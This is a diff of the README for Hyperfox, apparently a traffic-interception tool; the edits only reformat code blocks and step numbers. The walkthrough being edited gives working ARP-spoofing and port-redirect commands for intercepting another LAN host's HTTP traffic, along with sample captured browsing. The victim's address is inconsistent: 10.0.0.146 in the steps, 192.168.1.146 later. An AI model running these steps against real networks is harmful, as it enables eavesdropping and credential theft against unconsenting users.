@@ -33,14 +33,14 @@ You can download a pre-compiled binary of the Hyperfox tool:
 Once you've downloaded the appropriate binary move it to `$HOME/bin/hyperfox`
 and call it using the full path:
 
-```
+```sh
 $ ~/bin/hyperfox -h
 ```
 
 If you have `$HOME/bin` in your `$PATH`, you may as well call `hyperfox`
 without the full path:
 
-```
+```sh
 $ hyperfox -h
 ```
 
@@ -54,27 +54,27 @@ $ hyperfox -h
 
 ## Usage example
 
-I. Make sure the [dsniff][5] tool is installed in the MITM machine, we are
+**I**. Make sure the [dsniff][5] tool is installed in the MITM machine, we are
 going to use the `arpspoof` tool (part of [dsniff][5]) to alter the ARP table
 of a specific machine on LAN to make it redirect its traffic to us instead of
 to the legitimate LAN gateway. This ancient technique is known as
 [ARP spoofing][4].
 
-II. Identify the LAN IP of the machine you want to intercept traffic for. Let's
-suppose you want to intercept traffic from `10.0.0.146`.
+**II**. Identify the LAN IP of the machine you want to intercept traffic for.
+Let's suppose you want to intercept traffic from `10.0.0.146`.
 
-III. Identify the IP of your router and the name of the interface you're
+**III**. Identify the IP of your router and the name of the interface you're
 connected with, let's say your router is `10.0.0.1` and you're connected to
 the router through `wlan0`.
 
-```
+```sh
 $ sudo route
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 default         10.0.0.1        0.0.0.0         UG    0      0        0 wlan0
 ```
 
-IV. Put the MITM machine in [IP forwarding][3] mode.
+**IV**. Put the MITM machine in [IP forwarding][3] mode.
 
 ```sh
 # Linux
@@ -84,9 +84,9 @@ $ sudo sysctl -w net.ipv4.ip_forward=1
 $ sudo sysctl -w net.inet.ip.forwarding=1
 ```
 
-V. Run hyperfox (as a normal, unprivileged user) within a writable directory:
+**V**. Run hyperfox (as a normal, unprivileged user) within a writable directory:
 
-```
+```sh
 $ mkdir -p ~/tmp/hyperfox-session
 $ cd ~/tmp/hyperfox-session
 $ hyperfox
@@ -105,7 +105,7 @@ appropriate
 $ hyperfox -s -c ssl/cert.pem -k ssl/key.pem
 ```
 
-VI. Prepare the machine to forward everything but the port hyperfox will
+**VI**. Prepare the machine to forward everything but the port hyperfox will
 intercept (`80`, for plain HTTP), instead tell it to forward the traffic on
 port `80` to the `9999` port on `127.0.0.1` (where `hyperfox` is listening).
 
@@ -118,7 +118,7 @@ REDIRECT --to-port 9999
 $ sudo ipfw add fwd 127.0.0.1,9999 tcp from any to any 80 via wlan0
 ```
 
-VII. Run `arpspoof` to make `10.0.0.146` think our host is `10.0.0.1` (the
+**VII**. Run `arpspoof` to make `10.0.0.146` think our host is `10.0.0.1` (the
 LAN's legitimate gateway), once the ARP spoofing is completed, `10.0.0.146` will
 start to send its traffic through our machine.
 
@@ -126,14 +126,14 @@ start to send its traffic through our machine.
 $ sudo arpspoof -i wlan0 -t 10.0.0.146 10.0.0.1
 ```
 
-VIII. !???
+**VIII**. !???
 
-IX. Profit!!
+**IX**. Profit!!
 
 Once `192.168.1.146` starts to send some traffic, a `capture` directory will
 be created:
 
-```
+```sh
 $ cd ~/tmp/hyperfox-session
 $ ls
 capture
@@ -160,7 +160,7 @@ $ find .
 
 You can see whatever is happening by watching hyperfox's output:
 
-```
+```sh
 -> 10.0.0.146:61716 m.vanityfair.com: GET /business/features/2011/05/paul-allen-201105 HTTP/1.1 0b
 <- 10.0.0.146:61716 m.vanityfair.com: GET /business/features/2011/05/paul-allen-201105 HTTP/1.1 -1b 200
 -> 10.0.0.146:61716 m.vanityfair.com: GET /static/css/mobify.css?1335486443 HTTP/1.1 0b
